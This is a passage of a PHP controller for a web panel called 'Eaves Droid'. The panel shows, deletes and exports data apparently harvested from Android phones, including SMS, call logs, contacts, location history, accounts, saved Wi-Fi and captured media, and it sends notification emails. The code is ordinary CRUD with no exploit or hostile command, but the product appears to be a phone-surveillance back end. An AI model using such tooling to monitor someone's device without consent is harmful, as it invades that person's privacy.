    /** POST /advanced/hardware/thermal/delete/(:num) */
    public function delete_thermal($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_thermal_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/nfc */
    public function nfc()
    {
        $data = array_merge($this->commonData('nfc', 'NFC'), [
            'rows' => $this->finderModel->get_nfc($this->userId),
            'total' => $this->finderModel->get_count_Nfc($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/nfc', $data);
    }

    /** POST /advanced/hardware/nfc/delete/(:num) */
    public function delete_nfc($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_nfc_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/hardware_graphics */
    public function hardware_graphics()
    {
        $data = array_merge($this->commonData('hardware_graphics', 'Hardware Graphics'), [
            'rows' => $this->finderModel->get_hardware_graphics($this->userId),
            'total' => $this->finderModel->get_count_HardwareGraphics($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/hardware_graphics', $data);
    }

    /** POST /advanced/hardware/hardware_graphics/delete/(:num) */
    public function delete_hardware_graphics($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_hardware_graphics_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── NEW EXTRACTORS: Software ──

    /** GET /advanced/software/data_usage */
    public function data_usage()
    {
        $data = array_merge($this->commonData('data_usage', 'Data Usage'), [
            'rows' => $this->finderModel->get_data_usage($this->userId),
            'total' => $this->finderModel->get_count_DataUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/data_usage', $data);
    }

    /** POST /advanced/software/data_usage/delete/(:num) */
    public function delete_data_usage($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_data_usage_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/saved_wifi */
    public function saved_wifi()
    {
        $data = array_merge($this->commonData('saved_wifi', 'Saved WiFi'), [
            'rows' => $this->finderModel->get_saved_wifi($this->userId),
            'total' => $this->finderModel->get_count_SavedWifi($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/saved_wifi', $data);
    }

    /** POST /advanced/software/saved_wifi/delete/(:num) */
    public function delete_saved_wifi($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_saved_wifi_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/default_apps */
    public function default_apps()
    {
        $data = array_merge($this->commonData('default_apps', 'Default Apps'), [
            'rows' => $this->finderModel->get_default_apps($this->userId),
            'total' => $this->finderModel->get_count_DefaultApps($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/default_apps', $data);
    }

    /** POST /advanced/software/default_apps/delete/(:num) */
    public function delete_default_apps($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_default_apps_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/alarms */
    public function alarms()
    {
        $data = array_merge($this->commonData('alarms', 'Alarms & Jobs'), [
            'rows' => $this->finderModel->get_alarms($this->userId),
            'total' => $this->finderModel->get_count_Alarms($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/alarms', $data);
    }

    /** POST /advanced/software/alarms/delete/(:num) */
    public function delete_alarms($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_alarms_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Hardware Network ──
    public function hardware_network()
    {
        $data = array_merge($this->commonData('hardware_network', 'Network Hardware'), [
            'rows' => $this->finderModel->get_hardware_network($this->userId),
            'total' => $this->finderModel->get_count_HardwareNetwork($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/hardware_network', $data);
    }

    public function delete_hardware_network($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_hardware_network_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── App Security ──
    public function app_security()
    {
        $data = array_merge($this->commonData('app_security', 'App Security'), [
            'rows' => $this->finderModel->get_app_security($this->userId),
            'total' => $this->finderModel->get_count_AppSecurity($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/app_security', $data);
    }

    public function delete_app_security($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_app_security_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Network Security ──
    public function network_security()
    {
        $data = array_merge($this->commonData('network_security', 'Network Security'), [
            'rows' => $this->finderModel->get_network_security($this->userId),
            'total' => $this->finderModel->get_count_NetworkSecurity($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/network_security', $data);
    }

    public function delete_network_security($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_network_security_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Telephony Network ──
    public function telephony_network()
    {
        $data = array_merge($this->commonData('telephony_network', 'Mobile Network'), [
            'rows' => $this->finderModel->get_telephony_network($this->userId),
            'total' => $this->finderModel->get_count_TelephonyNetwork($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/telephony_network', $data);
    }

    public function delete_telephony_network($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_telephony_network_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── System Locale ──
    public function system_locale()
    {
        $data = array_merge($this->commonData('system_locale', 'System Locale'), [
            'rows' => $this->finderModel->get_system_locale($this->userId),
            'total' => $this->finderModel->get_count_SystemLocale($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/system_locale', $data);
    }

    public function delete_system_locale($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_system_locale_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /**
     * Unified delete — removes ALL user data across every extractor category.
     * Includes DB records AND uploaded files on disk. Sends an email notification.
     */
    public function delete_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\Mod_Finder();
        $result = $model->deleteAllUserData($userId);

        if ($result['success']) {
            $this->session->setFlashdata('success', 'All user data has been permanently deleted. A confirmation email has been sent.');

            if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
                $this->sendDeleteNotificationEmail($userId, $result['deleted'], $result['total_deleted']);
            }
        } else {
            $this->session->setFlashdata('error', 'Failed to delete some data. Check logs for details.');
        }

        redirect()->back();
    }

    /**
     * Unified export — returns a structured report of all user data organized by extractor category.
     * Sends an email notification with estimated sizes.
     */
    public function export_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\Mod_Finder();
        $data = $model->exportAllUserData($userId);

        if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
            $this->sendExportNotificationEmail($userId, $data);
        }

        header('Content-Type: application/json');
        header('Content-Disposition: ' . 'attachment; filename="data_export_' . $userId . '_' . date('Ymd_His') . '.json"');
        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }

    /**
     * Sends an HTML email notification confirming data deletion.
     */
    private function sendDeleteNotificationEmail(int $userId, array $deleted, int $totalDeleted): void
    {
        try {
            $email = \Config\Services::email();
            $email->initialize([
                'mailType'  => 'html',
                'charset'   => 'UTF-8',
                'wordWrap'  => true,
            ]);

            $sender = get_notification_sender();
            $email->setFrom($sender['email'], $sender['name']);
            $email->setTo($this->userData['email']);
            $email->setSubject('Eaves Droid — Data Deletion Confirmation');

            $username = $this->userData['username'] ?? 'User';
            $asAtTimestamp = date('Y-m-d H:i:s');

            // Build detailed category data with table labels
            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'Location History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_sms' => 'SMS Messages',
                'tbl_logs' => 'Call Logs',
                'tbl_contacts' => 'Contacts',
                'tbl_apps' => 'Installed Apps',
                'tbl_location' => 'Location History',
                'tbl_activity' => 'Activity Log',
                'tbl_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_context' => 'Device Context',
                'tbl_network_info' => 'Network Info',
                'tbl_nearby_wifi' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_calendar_events' => 'Calendar Events',
                'tbl_bluetooth' => 'Bluetooth',
                'tbl_bluetooth_paired' => 'Paired Bluetooth',
                'tbl_sensor_profile' => 'Sensor Profile',
                'tbl_device_profile' => 'Device Profile',
                'tbl_proc_info' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_running_process_details' => 'Process Details',
                'tbl_running_services' => 'Running Services',
                'tbl_camera_info' => 'Camera Info',
                'tbl_battery_stats' => 'Battery Stats',
                'tbl_accessibility_services' => 'Accessibility Services',
                'tbl_input_methods' => 'Input Methods',
                'tbl_input_method_subtypes' => 'Input Subtypes',
                'tbl_cell_towers' => 'Cell Tower Data',
                'tbl_display_info' => 'Display Info',
                'tbl_storage' => 'Storage',
                'tbl_thermal' => 'Thermal Data',
                'tbl_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_app_usage' => 'App Usage',
                'tbl_app_usage_sessions' => 'App Usage Sessions',
                'tbl_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_saved_wifi' => 'Saved Wi-Fi',
                'tbl_default_apps' => 'Default Apps',
                'tbl_alarms' => 'Alarms',
                'tbl_captured_media' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_config' => 'Device Config',
                'tbl_app_defaults' => 'App Defaults',
            ];

            // Build detailed category data from deleted array
            $categoriesWithTables = [];
            $model = new \App\Models\Mod_Finder();
            foreach (\App\Models\Mod_Finder::TABLE_REGISTRY as $catKey => $tables) {
                $tableList = is_array($tables) ? $tables : [$tables];
                $tables = [];
                foreach ($tableList as $table) {
                    if (!isset($deleted[$table])) continue;
                    $tables[] = [
                        'name'  => $table,
                        'count' => $deleted[$table],
                        'label' => $tableLabels[$table] ?? $table,
                    ];
                }
                if (!empty($tables)) {
                    $categoriesWithTables[$catKey] = [
                        'tables'       => $tables,
                        'total_rows'   => array_sum(array_column($tables, 'count')),
                    ];
                }
            }

            $body = view('email/data_delete_notification', [
                'username'           => $username,
                'asAtTimestamp'      => date('Y-m-d H:i:s'),
                'categories'         => $categoriesWithTables,
                'categoryLabels'     => $categoryLabels,
                'totalDeleted'       => $totalDeleted,
                'browser'            => $this->request->getUserAgent()->getAgentString() ?: '',
                'browserIp'          => $this->request->getIPAddress(),
                'timestamp'          => date('Y-m-d H:i:s'),
            ]);

            $email->setMessage($body);
            $email->send();

            log_message('info', 'Delete notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send delete notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }

    /**
     * Sends an HTML email notification confirming data export with estimated sizes.
     */
    private function sendExportNotificationEmail(int $userId, array $data): void
    {
        try {
            $email = \Config\Services::email();
            $email->initialize([
                'mailType'  => 'html',
                'charset'   => 'UTF-8',
                'wordWrap'  => true,
            ]);

            $sender = get_notification_sender();
            $email->setFrom($sender['email'], $sender['name']);
            $email->setTo($this->userData['email']);
            $email->setSubject('Eaves Droid — Data Export Complete');

            $username = $this->userData['username'] ?? 'User';

            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'Location History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_sms' => 'SMS Messages',
                'tbl_logs' => 'Call Logs',
                'tbl_contacts' => 'Contacts',
                'tbl_apps' => 'Installed Apps',
                'tbl_location' => 'Location History',
                'tbl_activity' => 'Activity Log',
                'tbl_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_context' => 'Device Context',
                'tbl_network_info' => 'Network Info',
                'tbl_nearby_wifi' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_calendar_events' => 'Calendar Events',
                'tbl_bluetooth' => 'Bluetooth',
                'tbl_bluetooth_paired' => 'Paired Bluetooth',
                'tbl_sensor_profile' => 'Sensor Profile',
                'tbl_device_profile' => 'Device Profile',
                'tbl_proc_info' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_running_process_details' => 'Process Details',
                'tbl_running_services' => 'Running Services',
                'tbl_camera_info' => 'Camera Info',
                'tbl_battery_stats' => 'Battery Stats',
                'tbl_accessibility_services' => 'Accessibility Services',
                'tbl_input_methods' => 'Input Methods',
                'tbl_input_method_subtypes' => 'Input Subtypes',
                'tbl_cell_towers' => 'Cell Tower Data',
                'tbl_display_info' => 'Display Info',
                'tbl_storage' => 'Storage',
                'tbl_thermal' => 'Thermal Data',
                'tbl_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_app_usage' => 'App Usage',
                'tbl_app_usage_sessions' => 'App Usage Sessions',
                'tbl_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_saved_wifi' => 'Saved Wi-Fi',
                'tbl_default_apps' => 'Default Apps',
                'tbl_alarms' => 'Alarms',
                'tbl_captured_media' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_config' => 'Device Config',
                'tbl_app_defaults' => 'App Defaults',
            ];

            $categoriesWithTables = [];
            foreach ($data['categories'] as $catKey => $catData) {
                $tables = [];
                foreach ($catData['tables'] as $tbl) {
                    $tables[] = [
                        'name'                 => $tbl['name'],
                        'count'                => $tbl['count'],
                        'estimated_size_human' => $tbl['estimated_size_human'],
                        'label'                => $tableLabels[$tbl['name']] ?? $tbl['name'],
                    ];
                }
                $categoriesWithTables[$catKey] = [
                    'tables'             => $tables,
                    'total_rows'         => $catData['total_rows'],
                    'total_size_human'   => $catData['total_size_human'],
                ];
            }

            $body = view('email/data_export_notification', [
                'username'           => $username,
                'asAtTimestamp'      => date('Y-m-d H:i:s'),
                'categories'         => $categoriesWithTables,
                'categoryLabels'     => $categoryLabels,
                'totalRows'          => $data['total_rows'],
                'totalSizeHuman'     => $data['total_size_human'],
                'browser'            => $this->request->getUserAgent()->getAgentString() ?: '',
                'browserIp'          => $this->request->getIPAddress(),
                'timestamp'          => date('Y-m-d H:i:s'),
            ]);

            $email->setMessage($body);
            $email->send();

            log_message('info', 'Export notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send export notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }
}
